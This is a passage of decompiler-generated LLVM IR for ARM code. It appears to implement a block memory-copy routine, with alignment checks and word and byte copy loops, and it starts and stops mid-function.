  %v2_19460 = sub i32 %v0_19460, %v1_19460
  %v3_19460 = icmp ult i32 %v0_19460, %v1_19460
  %v4_19460 = xor i32 %v1_19460, %v0_19460
  %v5_19460 = xor i32 %v2_19460, %v0_19460
  %v6_19460 = and i32 %v5_19460, %v4_19460
  %v7_19460 = icmp slt i32 %v6_19460, 0
  store i1 %v7_19460, i1* %cpsr_v.global-to-local, align 1
  %v8_19460 = icmp slt i32 %v2_19460, 0
  store i1 %v8_19460, i1* %cpsr_n.global-to-local, align 1
  %v9_19460 = icmp eq i32 %v0_19460, %v1_19460
  store i1 %v9_19460, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_19460, label %dec_label_pc_196b4, label %dec_label_pc_19468

dec_label_pc_19468:                               ; preds = %entry
  br i1 %v9_19460, label %.thread129, label %bb

.thread129:                                       ; preds = %bb153, %.thread128, %bb150, %dec_label_pc_19468
  %merge = phi i32 [ %v0_19460, %dec_label_pc_19468 ], [ %v2_19748, %bb150 ], [ %v11_19764, %bb153 ], [ %v7_19764, %.thread128 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_19468
  %v5_1946c = inttoptr i32 %v1_19460 to i8*
  store i8* %v5_1946c, i8** %stack_var_-8, align 4
  %v8_1946c = load i32, i32* @lr, align 4
  %v0_19470 = load i32, i32* @r2, align 4
  %v2_19470 = add i32 %v0_19470, -4
  store i32 %v2_19470, i32* %r2.global-to-local, align 4
  %v4_19470 = sub i32 3, %v0_19470
  %v5_19470 = and i32 %v4_19470, %v0_19470
  %v6_19470 = icmp slt i32 %v5_19470, 0
  store i1 %v6_19470, i1* %cpsr_v.global-to-local, align 1
  %v7_19470 = icmp slt i32 %v2_19470, 0
  store i1 %v7_19470, i1* %cpsr_n.global-to-local, align 1
  %v8_19470 = icmp eq i32 %v0_19470, 4
  store i1 %v8_19470, i1* %cpsr_z.global-to-local, align 1
  %v5_19474 = icmp slt i32 %v0_19470, 4
  br i1 %v5_19474, label %bb140, label %dec_label_pc_19478

dec_label_pc_19478:                               ; preds = %bb
  %v1_19478 = urem i32 %v1_19460, 4
  store i32 %v1_19478, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_19478 = icmp eq i32 %v1_19478, 0
  store i1 %v2_19478, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19478, label %dec_label_pc_19480, label %dec_label_pc_1952c

dec_label_pc_19480:                               ; preds = %dec_label_pc_19478
  %v1_19480 = urem i32 %v0_19460, 4
  store i32 %v1_19480, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_19480 = icmp eq i32 %v1_19480, 0
  store i1 %v2_19480, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_19460 to i2
  br i1 %v2_19480, label %dec_label_pc_19488, label %dec_label_pc_1955c

dec_label_pc_19488:                               ; preds = %dec_label_pc_19480, %dec_label_pc_19554
  %v0_194a093 = phi i32 [ %v1_19460, %dec_label_pc_19480 ], [ %v0_1967c76, %dec_label_pc_19554 ]
  %v0_1949c92 = phi i32 [ %v0_19460, %dec_label_pc_19480 ], [ %v0_19554, %dec_label_pc_19554 ]
  %v0_19488 = phi i32 [ %v2_19470, %dec_label_pc_19480 ], [ %v2_1954c, %dec_label_pc_19554 ]
  %v1_19488 = add i32 %v0_19488, -8
  store i32 %v1_19488, i32* %r2.global-to-local, align 4
  %v3_19488 = sub i32 7, %v0_19488
  %v4_19488 = and i32 %v3_19488, %v0_19488
  %v5_19488 = icmp slt i32 %v4_19488, 0
  store i1 %v5_19488, i1* %cpsr_v.global-to-local, align 1
  %v6_19488 = icmp slt i32 %v1_19488, 0
  store i1 %v6_19488, i1* %cpsr_n.global-to-local, align 1
  %v7_19488 = icmp eq i32 %v0_19488, 8
  store i1 %v7_19488, i1* %cpsr_z.global-to-local, align 1
  %v2_1948c = xor i1 %v6_19488, %v5_19488
  br i1 %v2_1948c, label %dec_label_pc_194dc, label %dec_label_pc_19490

dec_label_pc_19490:                               ; preds = %dec_label_pc_19488
  %v1_19490 = add i32 %v0_19488, -28
  store i32 %v1_19490, i32* %r2.global-to-local, align 4
  %v3_19490 = sub i32 27, %v0_19488
  %v4_19490 = and i32 %v3_19490, %v1_19488
  %v5_19490 = icmp slt i32 %v4_19490, 0
  store i1 %v5_19490, i1* %cpsr_v.global-to-local, align 1
  %v6_19490 = icmp slt i32 %v1_19490, 0
  store i1 %v6_19490, i1* %cpsr_n.global-to-local, align 1
  %v7_19490 = icmp eq i32 %v1_19488, 20
  store i1 %v7_19490, i1* %cpsr_z.global-to-local, align 1
  %v2_19494 = xor i1 %v6_19490, %v5_19490
  br i1 %v2_19494, label %dec_label_pc_194c8, label %dec_label_pc_19498

dec_label_pc_19498:                               ; preds = %dec_label_pc_19490
  %v0_19498 = load i32, i32* @r4, align 4
  store i32 %v0_19498, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1949c

dec_label_pc_1949c:                               ; preds = %dec_label_pc_1949c.dec_label_pc_1949c_crit_edge, %dec_label_pc_19498
  %v0_194a0 = phi i32 [ %v12_194a8, %dec_label_pc_1949c.dec_label_pc_1949c_crit_edge ], [ %v0_194a093, %dec_label_pc_19498 ]
  %v0_1949c = phi i32 [ %v0_1949c.pre, %dec_label_pc_1949c.dec_label_pc_1949c_crit_edge ], [ %v0_1949c92, %dec_label_pc_19498 ]
  %v1_1949c = inttoptr i32 %v0_1949c to i32*
  %v2_1949c = load i32, i32* %v1_1949c, align 4
  %v3_1949c = add i32 %v0_1949c, 4
  %v4_1949c = inttoptr i32 %v3_1949c to i32*
  %v5_1949c = load i32, i32* %v4_1949c, align 4
  store i32 %v5_1949c, i32* %r4.global-to-local, align 4
  %v6_1949c = add i32 %v0_1949c, 8
  %v7_1949c = inttoptr i32 %v6_1949c to i32*
  %v8_1949c = load i32, i32* %v7_1949c, align 4
  store i32 %v8_1949c, i32* %ip.global-to-local, align 4
  %v9_1949c = add i32 %v0_1949c, 12
  %v10_1949c = inttoptr i32 %v9_1949c to i32*
  %v11_1949c = load i32, i32* %v10_1949c, align 4
  store i32 %v11_1949c, i32* %lr.global-to-local, align 4
  %v12_1949c = add i32 %v0_1949c, 16
  store i32 %v12_1949c, i32* %r1.global-to-local, align 4
  %v1_194a0 = inttoptr i32 %v0_194a0 to i32*
  store i32 %v2_1949c, i32* %v1_194a0, align 4
  %v3_194a0 = add i32 %v0_194a0, 4
  %v4_194a0 = inttoptr i32 %v3_194a0 to i32*
  %v5_194a0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_194a0, i32* %v4_194a0, align 4
  %v6_194a0 = add i32 %v0_194a0, 8
  %v7_194a0 = inttoptr i32 %v6_194a0 to i32*
  %v8_194a0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_194a0, i32* %v7_194a0, align 4
  %v9_194a0 = add i32 %v0_194a0, 12
  %v10_194a0 = inttoptr i32 %v9_194a0 to i32*
  %v11_194a0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_194a0, i32* %v10_194a0, align 4
  %v12_194a0 = add i32 %v0_194a0, 16
  store i32 %v12_194a0, i32* %r0.global-to-local, align 4
  %v0_194a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_194a4 = inttoptr i32 %v0_194a4 to i32*
  %v2_194a4 = load i32, i32* %v1_194a4, align 4
  store i32 %v2_194a4, i32* @r3, align 4
  %v3_194a4 = add i32 %v0_194a4, 4
  %v4_194a4 = inttoptr i32 %v3_194a4 to i32*
  %v5_194a4 = load i32, i32* %v4_194a4, align 4
  store i32 %v5_194a4, i32* %r4.global-to-local, align 4
  %v6_194a4 = add i32 %v0_194a4, 8
  %v7_194a4 = inttoptr i32 %v6_194a4 to i32*
  %v8_194a4 = load i32, i32* %v7_194a4, align 4
  store i32 %v8_194a4, i32* @ip, align 4
  %v9_194a4 = add i32 %v0_194a4, 12
  %v10_194a4 = inttoptr i32 %v9_194a4 to i32*
  %v11_194a4 = load i32, i32* %v10_194a4, align 4
  store i32 %v11_194a4, i32* %lr.global-to-local, align 4
  %v12_194a4 = add i32 %v0_194a4, 16
  store i32 %v12_194a4, i32* %r1.global-to-local, align 4
  %v1_194a8 = inttoptr i32 %v12_194a0 to i32*
  store i32 %v2_194a4, i32* %v1_194a8, align 4
  %v3_194a8 = add i32 %v0_194a0, 20
  %v4_194a8 = inttoptr i32 %v3_194a8 to i32*
  %v5_194a8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_194a8, i32* %v4_194a8, align 4
  %v6_194a8 = add i32 %v0_194a0, 24
  %v7_194a8 = inttoptr i32 %v6_194a8 to i32*
  %v8_194a8 = load i32, i32* @ip, align 4
  store i32 %v8_194a8, i32* %v7_194a8, align 4
  %v9_194a8 = add i32 %v0_194a0, 28
  %v10_194a8 = inttoptr i32 %v9_194a8 to i32*
  %v11_194a8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_194a8, i32* %v10_194a8, align 4
  %v12_194a8 = add i32 %v0_194a0, 32
  store i32 %v12_194a8, i32* %r0.global-to-local, align 4
  %v0_194ac = load i32, i32* %r2.global-to-local, align 4
  %v1_194ac = add i32 %v0_194ac, -32
  store i32 %v1_194ac, i32* %r2.global-to-local, align 4
  %v3_194ac = sub i32 31, %v0_194ac
  %v4_194ac = and i32 %v3_194ac, %v0_194ac
  %v5_194ac = icmp slt i32 %v4_194ac, 0
  %v6_194ac = icmp slt i32 %v1_194ac, 0
  %v2_194b0 = xor i1 %v6_194ac, %v5_194ac
  br i1 %v2_194b0, label %dec_label_pc_194b4, label %dec_label_pc_1949c.dec_label_pc_1949c_crit_edge

dec_label_pc_1949c.dec_label_pc_1949c_crit_edge:  ; preds = %dec_label_pc_1949c
  %v0_1949c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1949c

dec_label_pc_194b4:                               ; preds = %dec_label_pc_1949c
  %v1_194b4 = add i32 %v0_194ac, -16
  %v3_194b4 = add i32 %v0_194ac, 2147483616
  %v4_194b4 = and i32 %v1_194b4, %v3_194b4
  %v5_194b4 = icmp slt i32 %v4_194b4, 0
  store i1 %v5_194b4, i1* %cpsr_v.global-to-local, align 1
  %v6_194b4 = icmp slt i32 %v1_194b4, 0
  store i1 %v6_194b4, i1* %cpsr_n.global-to-local, align 1
  %v7_194b4 = icmp eq i32 %v1_194b4, 0
  store i1 %v7_194b4, i1* %cpsr_z.global-to-local, align 1
  %v2_194b8 = xor i1 %v6_194b4, %v5_194b4
  br i1 %v2_194b8, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_194b4
  %v3_194b8 = load i32, i32* %r1.global-to-local, align 4
  %v4_194b8 = inttoptr i32 %v3_194b8 to i32*
  %v5_194b8 = load i32, i32* %v4_194b8, align 4
  store i32 %v5_194b8, i32* @r3, align 4
  %v6_194b8 = add i32 %v3_194b8, 4
  %v7_194b8 = inttoptr i32 %v6_194b8 to i32*
  %v8_194b8 = load i32, i32* %v7_194b8, align 4
  store i32 %v8_194b8, i32* %r4.global-to-local, align 4
  %v9_194b8 = add i32 %v3_194b8, 8
  %v10_194b8 = inttoptr i32 %v9_194b8 to i32*
  %v11_194b8 = load i32, i32* %v10_194b8, align 4
  store i32 %v11_194b8, i32* @ip, align 4
  %v12_194b8 = add i32 %v3_194b8, 12
  %v13_194b8 = inttoptr i32 %v12_194b8 to i32*
  %v14_194b8 = load i32, i32* %v13_194b8, align 4
  store i32 %v14_194b8, i32* %lr.global-to-local, align 4
  %v15_194b8 = add i32 %v3_194b8, 16
  store i32 %v15_194b8, i32* %r1.global-to-local, align 4
  %v4_194bc = inttoptr i32 %v12_194a8 to i32*
  store i32 %v5_194b8, i32* %v4_194bc, align 4
  %v6_194bc = add i32 %v0_194a0, 36
  %v7_194bc = inttoptr i32 %v6_194bc to i32*
  %v8_194bc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_194bc, i32* %v7_194bc, align 4
  %v9_194bc = add i32 %v0_194a0, 40
  %v10_194bc = inttoptr i32 %v9_194bc to i32*
  %v11_194bc = load i32, i32* @ip, align 4
  store i32 %v11_194bc, i32* %v10_194bc, align 4
  %v12_194bc = add i32 %v0_194a0, 44
  %v13_194bc = inttoptr i32 %v12_194bc to i32*
  %v14_194bc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_194bc, i32* %v13_194bc, align 4
  %v15_194bc = add i32 %v0_194a0, 48
  store i32 %v15_194bc, i32* %r0.global-to-local, align 4
  %v3_194c0 = load i32, i32* %r2.global-to-local, align 4
  %v4_194c0 = add i32 %v3_194c0, -16
  store i32 %v4_194c0, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_194b4, %bb136
  %v3_194d0101110 = phi i32 [ %v15_194bc, %bb136 ], [ %v12_194a8, %dec_label_pc_194b4 ]
  %v0_194c8.pre = phi i32 [ %v4_194c0, %bb136 ], [ %v1_194ac, %dec_label_pc_194b4 ]
  %v2_194c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_194c4, i32* @r4, align 4
  br label %dec_label_pc_194c8

dec_label_pc_194c8:                               ; preds = %dec_label_pc_19490, %bb137
  %v3_194d0100 = phi i32 [ %v0_194a093, %dec_label_pc_19490 ], [ %v3_194d0101110, %bb137 ]
  %v0_194c8 = phi i32 [ %v1_19490, %dec_label_pc_19490 ], [ %v0_194c8.pre, %bb137 ]
  %v1_194c8 = add i32 %v0_194c8, 20
  store i32 %v1_194c8, i32* %r2.global-to-local, align 4
  %v3_194c8 = sub i32 0, %v0_194c8
  %v4_194c8 = and i32 %v1_194c8, %v3_194c8
  %v5_194c8 = icmp slt i32 %v4_194c8, 0
  store i1 %v5_194c8, i1* %cpsr_v.global-to-local, align 1
  %v6_194c8 = icmp slt i32 %v1_194c8, 0
  store i1 %v6_194c8, i1* %cpsr_n.global-to-local, align 1
  %v7_194c8 = icmp eq i32 %v1_194c8, 0
  store i1 %v7_194c8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_194cc

dec_label_pc_194cc:                               ; preds = %.thread114, %dec_label_pc_194c8
  %v0_194dc.pre157 = phi i32 [ %v0_194dc.pre, %.thread114 ], [ %v1_194c8, %dec_label_pc_194c8 ]
  %v3_194d0 = phi i32 [ %v3_194d098115, %.thread114 ], [ %v3_194d0100, %dec_label_pc_194c8 ]
  %v1_194d4 = phi i1 [ %v1_194d8, %.thread114 ], [ %v5_194c8, %dec_label_pc_194c8 ]
  %v0_194d4 = phi i1 [ %v0_194d8, %.thread114 ], [ %v6_194c8, %dec_label_pc_194c8 ]
  %v2_194cc = xor i1 %v1_194d4, %v0_194d4
  br i1 %v2_194cc, label %.thread114, label %bb138

bb138:                                            ; preds = %dec_label_pc_194cc
  %v3_194cc = load i32, i32* %r1.global-to-local, align 4
  %v4_194cc = inttoptr i32 %v3_194cc to i32*
  %v5_194cc = load i32, i32* %v4_194cc, align 4
  store i32 %v5_194cc, i32* @r3, align 4
  %v6_194cc = add i32 %v3_194cc, 4
  %v7_194cc = inttoptr i32 %v6_194cc to i32*
  %v8_194cc = load i32, i32* %v7_194cc, align 4
  store i32 %v8_194cc, i32* @ip, align 4
  %v9_194cc = add i32 %v3_194cc, 8
  %v10_194cc = inttoptr i32 %v9_194cc to i32*
  %v11_194cc = load i32, i32* %v10_194cc, align 4
  store i32 %v11_194cc, i32* %lr.global-to-local, align 4
  %v12_194cc = add i32 %v3_194cc, 12
  store i32 %v12_194cc, i32* %r1.global-to-local, align 4
  %v4_194d0 = inttoptr i32 %v3_194d0 to i32*
  store i32 %v5_194cc, i32* %v4_194d0, align 4
  %v6_194d0 = add i32 %v3_194d0, 4
  %v7_194d0 = inttoptr i32 %v6_194d0 to i32*
  %v8_194d0 = load i32, i32* @ip, align 4
  store i32 %v8_194d0, i32* %v7_194d0, align 4
  %v9_194d0 = add i32 %v3_194d0, 8
  %v10_194d0 = inttoptr i32 %v9_194d0 to i32*
  %v11_194d0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_194d0, i32* %v10_194d0, align 4
  %v12_194d0 = add i32 %v3_194d0, 12
  store i32 %v12_194d0, i32* %r0.global-to-local, align 4
  %v3_194d4 = load i32, i32* %r2.global-to-local, align 4
  %v4_194d4 = add i32 %v3_194d4, -12
  store i32 %v4_194d4, i32* %r2.global-to-local, align 4
  %v6_194d4 = sub i32 11, %v3_194d4
  %v7_194d4 = and i32 %v6_194d4, %v3_194d4
  %v8_194d4 = icmp slt i32 %v7_194d4, 0
  store i1 %v8_194d4, i1* %cpsr_v.global-to-local, align 1
  %v9_194d4 = icmp slt i32 %v4_194d4, 0
  store i1 %v9_194d4, i1* %cpsr_n.global-to-local, align 1
  %v10_194d4 = icmp eq i32 %v3_194d4, 12
  store i1 %v10_194d4, i1* %cpsr_z.global-to-local, align 1
  br label %.thread114

.thread114:                                       ; preds = %dec_label_pc_194cc, %bb138
  %v0_194dc.pre = phi i32 [ %v4_194d4, %bb138 ], [ %v0_194dc.pre157, %dec_label_pc_194cc ]
  %v3_194d098115 = phi i32 [ %v12_194d0, %bb138 ], [ %v3_194d0, %dec_label_pc_194cc ]
  %v1_194d8 = phi i1 [ %v8_194d4, %bb138 ], [ %v1_194d4, %dec_label_pc_194cc ]
  %v0_194d8 = phi i1 [ %v9_194d4, %bb138 ], [ %v0_194d4, %dec_label_pc_194cc ]
  %v2_194d8 = xor i1 %v1_194d8, %v0_194d8
  br i1 %v2_194d8, label %dec_label_pc_194dc, label %dec_label_pc_194cc

dec_label_pc_194dc:                               ; preds = %.thread114, %dec_label_pc_19488
  %v4_194ec = phi i32 [ %v0_194a093, %dec_label_pc_19488 ], [ %v3_194d098115, %.thread114 ]
  %v0_194dc = phi i32 [ %v1_19488, %dec_label_pc_19488 ], [ %v0_194dc.pre, %.thread114 ]
  %v1_194dc = add i32 %v0_194dc, 8
  store i32 %v1_194dc, i32* %r2.global-to-local, align 4
  %v3_194dc = sub i32 0, %v0_194dc
  %v4_194dc = and i32 %v1_194dc, %v3_194dc
  %v5_194dc = icmp slt i32 %v4_194dc, 0
  store i1 %v5_194dc, i1* %cpsr_v.global-to-local, align 1
  %v6_194dc = icmp slt i32 %v1_194dc, 0
  store i1 %v6_194dc, i1* %cpsr_n.global-to-local, align 1
  %v7_194dc = icmp eq i32 %v1_194dc, 0
  store i1 %v7_194dc, i1* %cpsr_z.global-to-local, align 1
  %v2_194e0 = xor i1 %v6_194dc, %v5_194dc
  br i1 %v2_194e0, label %bb140, label %dec_label_pc_194e4

dec_label_pc_194e4:                               ; preds = %dec_label_pc_194dc
  %v1_194e4 = add i32 %v0_194dc, 4
  store i32 %v1_194e4, i32* %r2.global-to-local, align 4
  %v3_194e4 = sub i32 -5, %v0_194dc
  %v4_194e4 = and i32 %v3_194e4, %v1_194dc
  %v5_194e4 = icmp slt i32 %v4_194e4, 0
  store i1 %v5_194e4, i1* %cpsr_v.global-to-local, align 1
  %v6_194e4 = icmp slt i32 %v1_194e4, 0
  store i1 %v6_194e4, i1* %cpsr_n.global-to-local, align 1
  %v7_194e4 = icmp eq i32 %v1_194dc, 4
  store i1 %v7_194e4, i1* %cpsr_z.global-to-local, align 1
  %v2_194e8 = xor i1 %v6_194e4, %v5_194e4
  %v3_194e8 = load i32, i32* %r1.global-to-local, align 4
  %v4_194e8 = inttoptr i32 %v3_194e8 to i32*
  %v5_194e8 = load i32, i32* %v4_194e8, align 4
  store i32 %v5_194e8, i32* @r3, align 4
  %v7_194e8 = add i32 %v3_194e8, 4
  br i1 %v2_194e8, label %.thread121, label %bb139

.thread121:                                       ; preds = %dec_label_pc_194e4
  store i32 %v7_194e8, i32* %r1.global-to-local, align 4
  %v5_194ec = inttoptr i32 %v4_194ec to i32*
  store i32 %v5_194e8, i32* %v5_194ec, align 4
  %v6_194ec = load i32, i32* %r0.global-to-local, align 4
  %v7_194ec = add i32 %v6_194ec, 4
  store i32 %v7_194ec, i32* %r0.global-to-local, align 4
  %v0_194fc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_194e4
  %v7_194f0 = inttoptr i32 %v7_194e8 to i32*
  %v8_194f0 = load i32, i32* %v7_194f0, align 4
  store i32 %v8_194f0, i32* @ip, align 4
  %v9_194f0 = add i32 %v3_194e8, 8
  store i32 %v9_194f0, i32* %r1.global-to-local, align 4
  %v4_194f4 = inttoptr i32 %v4_194ec to i32*
  store i32 %v5_194e8, i32* %v4_194f4, align 4
  %v6_194f4 = add i32 %v4_194ec, 4
  %v7_194f4 = inttoptr i32 %v6_194f4 to i32*
  %v8_194f4 = load i32, i32* @ip, align 4
  store i32 %v8_194f4, i32* %v7_194f4, align 4
  %v9_194f4 = add i32 %v4_194ec, 8
  store i32 %v9_194f4, i32* %r0.global-to-local, align 4
  %v3_194f8 = load i32, i32* %r2.global-to-local, align 4
  %v4_194f8 = add i32 %v3_194f8, -4
  store i32 %v4_194f8, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread121, %.thread127, %dec_label_pc_194dc, %bb, %dec_label_pc_196ac, %dec_label_pc_19640, %dec_label_pc_195d4, %bb139
  %v0_194fc = phi i32 [ %v0_194fc.pre, %.thread121 ], [ %v2_1954c, %.thread127 ], [ %v1_194dc, %dec_label_pc_194dc ], [ %v2_19470, %bb ], [ %v0_194fc60, %dec_label_pc_196ac ], [ %v0_194fc59, %dec_label_pc_19640 ], [ %v0_194fc58, %dec_label_pc_195d4 ], [ %v4_194f8, %bb139 ]
  %v1_194fc = add i32 %v0_194fc, 4
  store i32 %v1_194fc, i32* %r2.global-to-local, align 4
  %v3_194fc = sub i32 0, %v0_194fc
  %v4_194fc = and i32 %v1_194fc, %v3_194fc
  %v5_194fc = icmp slt i32 %v4_194fc, 0
  store i1 %v5_194fc, i1* %cpsr_v.global-to-local, align 1
  %v6_194fc = icmp slt i32 %v1_194fc, 0
  store i1 %v6_194fc, i1* %cpsr_n.global-to-local, align 1
  %v7_194fc = icmp eq i32 %v1_194fc, 0
  store i1 %v7_194fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_194fc, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_19504.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_19500 = load i8*, i8** %stack_var_-8, align 4
  %v4_19500 = ptrtoint i8* %v3_19500 to i32
  store i32 %v4_19500, i32* %r0.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_19504 = phi i32 [ %v0_19504.pre, %bb140.bb142_crit_edge ], [ %v8_1946c, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_194fc, i32 %v0_19504)
  %v0_19508 = load i32, i32* %r2.global-to-local, align 4
  %v1_19508 = add i32 %v0_19508, -2
  %v3_19508 = sub i32 1, %v0_19508
  %v4_19508 = and i32 %v3_19508, %v0_19508
  %v5_19508 = icmp slt i32 %v4_19508, 0
  store i1 %v5_19508, i1* %cpsr_v.global-to-local, align 1
  %v6_19508 = icmp slt i32 %v1_19508, 0
  store i1 %v6_19508, i1* %cpsr_n.global-to-local, align 1
  %v7_19508 = icmp eq i32 %v0_19508, 2
  store i1 %v7_19508, i1* %cpsr_z.global-to-local, align 1
  %v0_1950c = load i32, i32* %r1.global-to-local, align 4
  %v1_1950c = inttoptr i32 %v0_1950c to i8*
  %v2_1950c = load i8, i8* %v1_1950c, align 1
  %v5_1950c = add i32 %v0_1950c, 1
  store i32 %v5_1950c, i32* %r1.global-to-local, align 4
  %v2_19510 = load i32, i32* %r0.global-to-local, align 4
  %v3_19510 = inttoptr i32 %v2_19510 to i8*
  store i8 %v2_1950c, i8* %v3_19510, align 1
  %v4_19510 = load i32, i32* %r0.global-to-local, align 4
  %v5_19510 = add i32 %v4_19510, 1
  store i32 %v5_19510, i32* %r0.global-to-local, align 4
  %v0_19514 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_19514 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_19514 = xor i1 %v0_19514, %v1_19514
  br i1 %v2_19514, label %.thread124, label %bb143

bb143:                                            ; preds = %bb142
  %v3_19514 = load i32, i32* %r1.global-to-local, align 4
  %v4_19514 = inttoptr i32 %v3_19514 to i8*
  %v5_19514 = load i8, i8* %v4_19514, align 1
  %v8_19514 = add i32 %v3_19514, 1
  store i32 %v8_19514, i32* %r1.global-to-local, align 4
  %v6_19518 = inttoptr i32 %v5_19510 to i8*
  store i8 %v5_19514, i8* %v6_19518, align 1
  %v7_19518 = load i32, i32* %r0.global-to-local, align 4
  %v8_19518 = add i32 %v7_19518, 1
  store i32 %v8_19518, i32* %r0.global-to-local, align 4
  %v1_1951c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1951c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread124

.thread124:                                       ; preds = %bb142, %bb143
  %v7_19520 = phi i32 [ %v8_19518, %bb143 ], [ %v5_19510, %bb142 ]
  %v2_19520 = phi i1 [ %v2_1951c.pre, %bb143 ], [ %v1_19514, %bb142 ]
  %v1_19520 = phi i1 [ %v1_1951c.pre, %bb143 ], [ %v0_19514, %bb142 ]
  %v0_1951c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1951c = xor i1 %v2_19520, %v1_19520
  %v4_1951c = or i1 %v0_1951c, %v3_1951c
  br i1 %v4_1951c, label %.thread125, label %bb144

bb144:                                            ; preds = %.thread124
  %v5_1951c = load i32, i32* %r1.global-to-local, align 4
  %v6_1951c = inttoptr i32 %v5_1951c to i8*
  %v7_1951c = load i8, i8* %v6_1951c, align 1
  %v10_1951c = add i32 %v5_1951c, 1
  store i32 %v10_1951c, i32* %r1.global-to-local, align 4
  %v8_19520 = inttoptr i32 %v7_19520 to i8*
  store i8 %v7_1951c, i8* %v8_19520, align 1
  %v9_19520 = load i32, i32* %r0.global-to-local, align 4
  %v10_19520 = add i32 %v9_19520, 1
  store i32 %v10_19520, i32* %r0.global-to-local, align 4
  br label %.thread125

.thread125:                                       ; preds = %.thread124, %bb144
  %v2_19524 = load i8*, i8** %stack_var_-8, align 4
  %v3_19524 = ptrtoint i8* %v2_19524 to i32
  store i32 %v3_19524, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v8_1946c)
  %v0_1952c.pre = load i32, i32* @ip, align 4
  %v0_19534.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_19538.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1952c

dec_label_pc_1952c:                               ; preds = %dec_label_pc_19478, %.thread125
  %v2_19538 = phi i32 [ %v1_19460, %dec_label_pc_19478 ], [ %v2_19538.pre, %.thread125 ]
  %v0_19534 = phi i32 [ %v0_19460, %dec_label_pc_19478 ], [ %v0_19534.pre, %.thread125 ]
  %v0_1952c = phi i32 [ %v1_19478, %dec_label_pc_19478 ], [ %v0_1952c.pre, %.thread125 ]
  %v1_1952c = sub i32 4, %v0_1952c
  store i32 %v1_1952c, i32* @ip, align 4
  %v1_19530 = add i32 %v1_1952c, -2
  %v3_19530 = sub i32 1, %v1_1952c
  %v4_19530 = and i32 %v3_19530, %v1_1952c
  %v5_19530 = icmp slt i32 %v4_19530, 0
  store i1 %v5_19530, i1* %cpsr_v.global-to-local, align 1
  %v6_19530 = icmp slt i32 %v1_19530, 0
  store i1 %v6_19530, i1* %cpsr_n.global-to-local, align 1
  %v7_19530 = icmp eq i32 %v1_1952c, 2
  store i1 %v7_19530, i1* %cpsr_z.global-to-local, align 1
  %v1_19534 = inttoptr i32 %v0_19534 to i8*
  %v2_19534 = load i8, i8* %v1_19534, align 1
  %v3_19534 = zext i8 %v2_19534 to i32
  store i32 %v3_19534, i32* @r3, align 4
  %v5_19534 = add i32 %v0_19534, 1
  store i32 %v5_19534, i32* %r1.global-to-local, align 4
  %v3_19538 = inttoptr i32 %v2_19538 to i8*
  store i8 %v2_19534, i8* %v3_19538, align 1
  %v4_19538 = load i32, i32* %r0.global-to-local, align 4
  %v5_19538 = add i32 %v4_19538, 1
  store i32 %v5_19538, i32* %r0.global-to-local, align 4
  %v0_1953c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1953c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1953c = xor i1 %v0_1953c, %v1_1953c
  br i1 %v2_1953c, label %.thread126, label %bb145

bb145:                                            ; preds = %dec_label_pc_1952c
  %v3_1953c = load i32, i32* %r1.global-to-local, align 4
  %v4_1953c = inttoptr i32 %v3_1953c to i8*
  %v5_1953c = load i8, i8* %v4_1953c, align 1
  %v6_1953c = zext i8 %v5_1953c to i32
  store i32 %v6_1953c, i32* @r3, align 4
  %v8_1953c = add i32 %v3_1953c, 1
  store i32 %v8_1953c, i32* %r1.global-to-local, align 4
  %v6_19540 = inttoptr i32 %v5_19538 to i8*
  store i8 %v5_1953c, i8* %v6_19540, align 1
  %v7_19540 = load i32, i32* %r0.global-to-local, align 4
  %v8_19540 = add i32 %v7_19540, 1
  store i32 %v8_19540, i32* %r0.global-to-local, align 4
  %v1_19544.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_19544.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread126

.thread126:                                       ; preds = %dec_label_pc_1952c, %bb145
  %v7_19548 = phi i32 [ %v8_19540, %bb145 ], [ %v5_19538, %dec_label_pc_1952c ]
  %v2_19548 = phi i1 [ %v2_19544.pre, %bb145 ], [ %v1_1953c, %dec_label_pc_1952c ]
